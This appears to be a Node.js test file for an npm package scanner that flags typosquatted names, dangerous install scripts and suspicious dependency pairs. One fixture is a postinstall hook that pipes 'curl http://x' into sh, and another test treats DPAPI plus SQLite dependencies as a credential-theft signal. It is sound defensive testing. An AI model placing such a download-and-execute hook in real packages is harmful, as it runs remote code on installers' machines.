const test = require('node:test');
const assert = require('node:assert');
const { typosquatOf } = require('../src/typosquat');
const { analyzePackage } = require('../src/scan');

test('typosquat catches transposition and single-char typos', () => {
  assert.strictEqual(typosquatOf('axois'), 'axios');
  assert.strictEqual(typosquatOf('expres'), 'express');
  assert.strictEqual(typosquatOf('@scope/lodahs'), 'lodash');
});
test('typosquat ignores real and unrelated names', () => {
  assert.strictEqual(typosquatOf('axios'), null);
  assert.strictEqual(typosquatOf('left-pad'), null);
});
test('download+execute postinstall is critical', () => {
  const r = analyzePackage({ scripts: { postinstall: 'node -e "require(\'child_process\').exec(\'curl http://x | sh\')"' } });
  assert.ok(r.critical.length);
});
test('benign install script is not critical', () => {
  const r = analyzePackage({ scripts: { postinstall: 'node-gyp rebuild' } });
  assert.strictEqual(r.critical.length, 0);
});
test('dpapi + sqlite deps are critical', () => {
  const r = analyzePackage({ dependencies: { 'node-dpapi': '1', 'better-sqlite3': '1' } });
  assert.ok(r.critical.length);
});
